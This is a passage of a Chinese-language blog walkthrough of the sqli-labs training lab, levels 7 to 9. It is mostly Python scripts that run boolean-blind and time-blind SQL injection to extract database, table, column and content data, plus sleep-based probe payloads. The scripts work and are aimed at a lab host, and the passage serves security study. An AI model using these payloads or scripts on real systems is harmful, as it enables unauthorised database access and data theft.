class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  payload4 = <span class=\"string\">&quot; 1&#x27;)) and (length((select group_concat(table_name) from information_schema.tables where</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">Â  Â  Â  Â  table_schema=database())))&gt;&quot;</span> + <span class=\"built_in\">str</span>(</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  j) + <span class=\"string\">&quot;-- ss&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  param = &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"string\">&quot;id&quot;</span>: payload4,</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  response = requests.get(url, params=param, headers=headers)</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">if</span> response.text.find(flag) != -<span class=\"number\">1</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  n = n</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  k = j</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">else</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  k = k</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  n = j</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  j = (n - k) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">elif</span> j - k == <span class=\"number\">3</span> <span class=\"keyword\">or</span> j - k &lt; <span class=\"number\">3</span>: <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(k - <span class=\"number\">1</span>, n + <span class=\"number\">2</span>):</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  payload5=<span class=\"string\">&quot;1&#x27;)) and (length((select group_concat(table_name) from information_schema.tables where table_schema = database())))=&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  + <span class=\"built_in\">str</span>( i) + <span class=\"string\">&quot;-- ss&quot;</span> param=&#123; <span class=\"string\">&quot;id&quot;</span> : payload5, &#125; response=requests.get(url, params=param, headers=headers) <span class=\"keyword\">if</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  response.text.find(flag) !=-<span class=\"number\">1</span>: length=i <span class=\"keyword\">break</span> <span class=\"keyword\">break</span> <span class=\"keyword\">else</span>: <span class=\"keyword\">break</span> <span class=\"built_in\">print</span>(<span class=\"string\">&quot;the name of all tables in current</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">Â  Â  Â  Â  Â  Â  database contains &quot;</span> + <span class=\"built_in\">str</span>(length) + <span class=\"string\">&quot; characters&quot;</span>) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, length + <span class=\"number\">1</span>): <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> keylist:</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  payload6=<span class=\"string\">&quot;1&#x27;)) and substr((select group_concat(table_name) from information_schema.tables where table_schema = database()),&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  + <span class=\"built_in\">str</span>( i) + <span class=\"string\">&quot;,1)=&#x27;&quot;</span> + c + <span class=\"string\">&quot;&#x27;-- ss&quot;</span> param=&#123; <span class=\"string\">&quot;id&quot;</span> : payload6, &#125; response=requests.get(url, params=param,</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  headers=headers) <span class=\"keyword\">if</span> response.text.find(flag) !=-<span class=\"number\">1</span>: tname=tname + c <span class=\"keyword\">break</span> <span class=\"built_in\">print</span>(<span class=\"string\">&quot;the name of all tables in</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">Â  Â  Â  Â  Â  Â  current database is &quot;</span> + <span class=\"built_in\">str</span>(tname))</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Columns7</span>(<span class=\"params\">table</span>): Â <span class=\"comment\"># tableå‚æ•°æ˜¯éœ€è¦çˆ†ç ´çš„æ•°æ®è¡¨åç§°ï¼Œè®°å¾—åŠ å•å¼•å·</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  n = <span class=\"number\">200</span> Â <span class=\"comment\"># é¢„æµ‹æŸä¸ªè¡¨æ‰€æœ‰åˆ—åç§°æœ€å¤§å¯èƒ½çš„é•¿åº¦ï¼Œæ ¹æ®å®é™…æƒ…å†µå¡«å†™</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  k = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  j = n // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  length = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  cname = <span class=\"built_in\">str</span>()</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">if</span> j &gt; k <span class=\"keyword\">and</span> j &lt; n <span class=\"keyword\">and</span> j - k &gt; <span class=\"number\">3</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  payload7 = <span class=\"string\">&quot; 1&#x27;)) and (length((select group_concat(column_name) from information_schema.columns where</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">Â  Â  Â  Â  Â  Â  table_name=&#x27;&quot;</span> + table + <span class=\"string\">&quot;&#x27; and table_schema=database())))&gt;&quot;</span> + <span class=\"built_in\">str</span>(</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  j) + <span class=\"string\">&quot;-- ss&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  param = &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"string\">&quot;id&quot;</span>: payload7,</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  response = requests.get(url, params=param, headers=headers)</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"keyword\">if</span> response.text.find(flag) != -<span class=\"number\">1</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  n = n</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  k = j</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"keyword\">else</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  k = k</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  n = j</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  j = (n - k) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"keyword\">elif</span> j - k == <span class=\"number\">3</span> <span class=\"keyword\">or</span> j - k &lt; <span class=\"number\">3</span>: <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(k - <span class=\"number\">1</span>, n + <span class=\"number\">2</span>):</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  payload8=<span class=\"string\">&quot;1&#x27;)) and (length((select group_concat(column_name) from information_schema.columns where table_name = &#x27;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  + table + <span class=\"string\">&quot;&#x27; and table_schema = database())))=&quot;</span> + <span class=\"built_in\">str</span>( i) + <span class=\"string\">&quot;-- ss&quot;</span> param=&#123; <span class=\"string\">&quot;id&quot;</span> : payload8, &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  response=requests.get(url, params=param, headers=headers) <span class=\"keyword\">if</span> response.text.find(flag) !=-<span class=\"number\">1</span>: length=i</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  <span class=\"keyword\">break</span> <span class=\"keyword\">break</span> <span class=\"keyword\">else</span>: <span class=\"keyword\">break</span> <span class=\"built_in\">print</span>(<span class=\"string\">&quot;the name of all columns in current table contains &quot;</span> + <span class=\"built_in\">str</span>(length) + <span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">Â  Â  Â  Â  Â  Â  Â  Â  characters&quot;</span>) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, length + <span class=\"number\">1</span>): <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> keylist:</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  payload9=<span class=\"string\">&quot;1&#x27;)) and substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  + table + <span class=\"string\">&quot;&#x27; and table_schema = database()),&quot;</span> + <span class=\"built_in\">str</span>( i) + <span class=\"string\">&quot;,1)=&#x27;&quot;</span> + c + <span class=\"string\">&quot;&#x27;-- ss&quot;</span> param=&#123; <span class=\"string\">&quot;id&quot;</span> :</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  payload9, &#125; response=requests.get(url, params=param, headers=headers) <span class=\"keyword\">if</span> response.text.find(flag) !=-<span class=\"number\">1</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  cname=cname + c <span class=\"keyword\">break</span> <span class=\"built_in\">print</span>(<span class=\"string\">&quot;the name of all columns in current table is &quot;</span> + <span class=\"built_in\">str</span>(cname))</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Content7</span>(<span class=\"params\">table, col1, col2</span>): Â <span class=\"comment\"># tableå‚æ•°æ˜¯éœ€è¦çˆ†ç ´çš„æ•°æ®è¡¨åç§°ï¼Œcol1å’Œcol2æ˜¯éœ€è¦çˆ†ç ´å†…å®¹çš„åˆ—ï¼Œè®°å¾—éƒ½è¦åŠ å•å¼•å·</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  n = <span class=\"number\">200</span> Â <span class=\"comment\"># é¢„æµ‹æœŸæœ›è·å–çš„æ•°æ®çš„æœ€å¤§å¯èƒ½çš„é•¿åº¦ï¼Œæ ¹æ®å®é™…æƒ…å†µå¡«å†™</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  k = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  j = n // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  length = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  content = <span class=\"built_in\">str</span>()</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">if</span> j &gt; k <span class=\"keyword\">and</span> j &lt; n <span class=\"keyword\">and</span> j - k &gt; <span class=\"number\">3</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  payload10 = <span class=\"string\">&quot; 1&#x27;)) and (length((select group_concat(concat(&quot;</span> + col1 + <span class=\"string\">&quot;,&#x27;^&#x27;,&quot;</span> + col2 + <span class=\"string\">&quot;)) from &quot;</span> + table</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  + <span class=\"string\">&quot;)))&gt;&quot;</span> + <span class=\"built_in\">str</span>( j) + <span class=\"string\">&quot;-- ss&quot;</span> param=&#123; <span class=\"string\">&quot;id&quot;</span> : payload10, &#125; response=requests.get(url, params=param,</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  headers=headers) <span class=\"keyword\">if</span> response.text.find(flag) !=-<span class=\"number\">1</span>: n=n k=j <span class=\"keyword\">else</span>: k=k n=j j=(n - k) // <span class=\"number\">2</span> <span class=\"keyword\">elif</span> j - k==<span class=\"number\">3</span> <span class=\"keyword\">or</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  j - k &lt; <span class=\"number\">3</span>: <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(k - <span class=\"number\">1</span>, n + <span class=\"number\">2</span>): payload11=<span class=\"string\">&quot;1&#x27;)) and (length((select group_concat(concat(&quot;</span> +</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  col1 + <span class=\"string\">&quot;,&#x27;^&#x27;,&quot;</span> + col2 + <span class=\"string\">&quot;)) from &quot;</span> + table + <span class=\"string\">&quot;)))=&quot;</span> + <span class=\"built_in\">str</span>( i) + <span class=\"string\">&quot;-- ss&quot;</span> param=&#123; <span class=\"string\">&quot;id&quot;</span> : payload11, &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  response=requests.get(url, params=param, headers=headers) <span class=\"keyword\">if</span> response.text.find(flag) !=-<span class=\"number\">1</span>: length=i</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  <span class=\"keyword\">break</span> <span class=\"keyword\">break</span> <span class=\"keyword\">else</span>: <span class=\"keyword\">break</span> <span class=\"built_in\">print</span>(<span class=\"string\">&quot;the content contains &quot;</span> + <span class=\"built_in\">str</span>(length) + <span class=\"string\">&quot; characters&quot;</span>) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  length + <span class=\"number\">1</span>): <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> keylist: payload12=<span class=\"string\">&quot;1&#x27;)) and substr((select group_concat(concat(&quot;</span> + col1 + <span class=\"string\">&quot;,&#x27;^&#x27;,&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  + col2 + <span class=\"string\">&quot;)) from &quot;</span> + table + <span class=\"string\">&quot;),&quot;</span> + <span class=\"built_in\">str</span>( i) + <span class=\"string\">&quot;,1)=&#x27;&quot;</span> + c + <span class=\"string\">&quot;&#x27;-- ss&quot;</span> param=&#123; <span class=\"string\">&quot;id&quot;</span> : payload12, &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  response=requests.get(url, params=param, headers=headers) <span class=\"keyword\">if</span> response.text.find(flag) !=-<span class=\"number\">1</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  content=content + c <span class=\"keyword\">break</span> <span class=\"built_in\">print</span>(<span class=\"string\">&quot;the content is &quot;</span> + <span class=\"built_in\">str</span>(content))</span><br><span class=\"line\"></span><br><span class=\"line\">CurrentDatabase7()</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"comment\">#è°ƒç”¨å‡½æ•°å³å¯,CurrentDatabase()æŸ¥çœ‹å½“å‰æ•°æ®åº“</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"comment\">#Tables7()æŸ¥çœ‹å½“å‰æ•°æ®åº“çš„æ‰€æœ‰è¡¨</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"comment\">#Columns7(&#x27;è¡¨å&#x27;)æŸ¥çœ‹è¯¥è¡¨çš„æ‰€æœ‰å­—æ®µ</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"comment\">#Content7(&#x27;è¡¨å&#x27;,&#x27;å­—æ®µ1&#x27;,&#x27;å­—æ®µ2&#x27;)</span></span><br></pre></td></tr></table></figure>\n<p>è¿™é‡Œå€Ÿé‰´äº†å¤§ä½¬çš„è„šæœ¬è‡ªå·±ä¿®æ”¹äº†ä¸€äº›å†…å®¹ï¼Œ<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0phY3F1ZWxpblhpYW5nL3NxbGlfYm9vbA==\"> è„šæœ¬åœ°å€</span></p>\n<h2 id=\"less8\"><a class=\"markdownIt-Anchor\" href=\"#less8\">#</a> less8</h2>\n<p>ä¸ä¸Šä¸€å…³ä¸€æ ·çš„å¸ƒå°”ç›²æ³¨ï¼Œé—­åˆæƒ…å†µå˜æˆäº† 1â€™è€Œä¸æ˜¯ 1â€™))</p>\n<h2 id=\"less9\"><a class=\"markdownIt-Anchor\" href=\"#less9\">#</a> less9</h2>\n<p>æ­¤å…³ä¸ç®¡è¾“å…¥æ˜¯å¦æ­£ç¡®éƒ½å›æ˜¾ä¸€ä¸ªé¡µé¢ï¼Œå³ id=1 (å­˜åœ¨) å’Œ id=-1 (ä¸å­˜åœ¨) éƒ½è¿”å›ä¸€æ ·çš„å›æ˜¾ï¼Œéœ€è¦ç”¨åˆ°æ—¶é—´ç›²æ³¨ï¼Œ<a href=\"https://hq185187.github.io/2023/05/07/sql%E6%B3%A8%E5%85%A5%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/\"> æ—¶é—´ç›²æ³¨åŸºç¡€</a><br>\nå…ˆè¯•æ¢å®ƒçš„é—­åˆæƒ…å†µ</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1 and if(1,sleep(1),1)--+</span><br><span class=\"line\">?id=1&#x27; and if(1,sleep(1),1)--+  è¿™ä¸ªæ˜¯</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests  </span><br><span class=\"line\">  </span><br><span class=\"line\">url = <span class=\"string\">&quot;http://sqli-labs:100/Less-9/&quot;</span> <span class=\"comment\"># æœ‰å¯åˆ©ç”¨æ¼æ´çš„urlï¼Œæ ¹æ®å®é™…æƒ…å†µå¡«å†™  </span></span><br><span class=\"line\">headers = &#123;  </span><br><span class=\"line\"><span class=\"string\">&quot;User-Agent&quot;</span>: <span class=\"string\">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36&quot;</span>,  </span><br><span class=\"line\">&#125; <span class=\"comment\"># http requestæŠ¥æ–‡å¤´éƒ¨ï¼Œæ ¹æ®å®é™…æƒ…å†µå¡«å†™  </span></span><br><span class=\"line\">  </span><br><span class=\"line\">keylist = [<span class=\"built_in\">chr</span>(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">33</span>, <span class=\"number\">127</span>)] <span class=\"comment\"># åŒ…æ‹¬æ•°å­—ã€å¤§å°å†™å­—æ¯ã€å¯è§ç‰¹æ®Šå­—ç¬¦  </span></span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">CurrentDatabaseTime</span>():  </span><br><span class=\"line\">n = <span class=\"number\">10</span> <span class=\"comment\"># é¢„æµ‹å½“å‰æ•°æ®åº“åç§°æœ€å¤§å¯èƒ½çš„é•¿åº¦ï¼Œæ ¹æ®å®é™…æƒ…å†µå¡«å†™  </span></span><br><span class=\"line\">k = <span class=\"number\">0</span>  </span><br><span class=\"line\">j = n // <span class=\"number\">2</span>  </span><br><span class=\"line\">length = <span class=\"number\">0</span>  </span><br><span class=\"line\">db = <span class=\"built_in\">str</span>()  </span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:  </span><br><span class=\"line\"><span class=\"keyword\">if</span> j &gt; k <span class=\"keyword\">and</span> j &lt; n <span class=\"keyword\">and</span> j - k &gt; <span class=\"number\">3</span>:  </span><br><span class=\"line\">payload1 = <span class=\"string\">&quot;1&#x27; and if(length(database())&gt;&quot;</span> + <span class=\"built_in\">str</span>(j) + <span class=\"string\">&quot;,sleep(3),1)-- ss&quot;</span> <span class=\"comment\"># æ‰€æœ‰payloadæ ¹æ®å®é™…æƒ…å†µå¡«å†™  </span></span><br><span class=\"line\">param = &#123;  </span><br><span class=\"line\"><span class=\"string\">&quot;id&quot;</span>: payload1,  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">try</span>:  </span><br><span class=\"line\">response = requests.get(url, params=param, headers=headers,  </span><br><span class=\"line\">timeout=<span class=\"number\">2</span>) <span class=\"comment\"># æœ¬è„šæœ¬æ ¹æ®GETå‹æ³¨å…¥ç¼–å†™ï¼Œé‡åˆ°POSTå‹å¯ä¿®æ”¹æ”¹è¡Œæ–¹æ³•å’Œå‚æ•°ï¼Œå…¶ä»–æ‰€æœ‰å‡½æ•°ä¸­åŒæ ·  </span></span><br><span class=\"line\">k = k  </span><br><span class=\"line\">n = j  </span><br><span class=\"line\"><span class=\"keyword\">except</span>:  </span><br><span class=\"line\">n = n  </span><br><span class=\"line\">k = j  </span><br><span class=\"line\">j = (n - k) // <span class=\"number\">2</span>  </span><br><span class=\"line\"><span class=\"keyword\">elif</span> j - k == <span class=\"number\">3</span> <span class=\"keyword\">or</span> j - k &lt; <span class=\"number\">3</span>:  </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(k - <span class=\"number\">1</span>, n + <span class=\"number\">2</span>):  </span><br><span class=\"line\">payload2 = <span class=\"string\">&quot;1&#x27; and if(length(database())=&quot;</span> + <span class=\"built_in\">str</span>(i) + <span class=\"string\">&quot;,sleep(3),1)-- ss&quot;</span>  </span><br><span class=\"line\">param = &#123;  </span><br><span class=\"line\"><span class=\"string\">&quot;id&quot;</span>: payload2,  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">try</span>:  </span><br><span class=\"line\">response = requests.get(url, params=param, headers=headers, timeout=<span class=\"number\">2</span>)  </span><br><span class=\"line\"><span class=\"keyword\">except</span>:  </span><br><span class=\"line\">length = i  </span><br><span class=\"line\"><span class=\"keyword\">break</span>  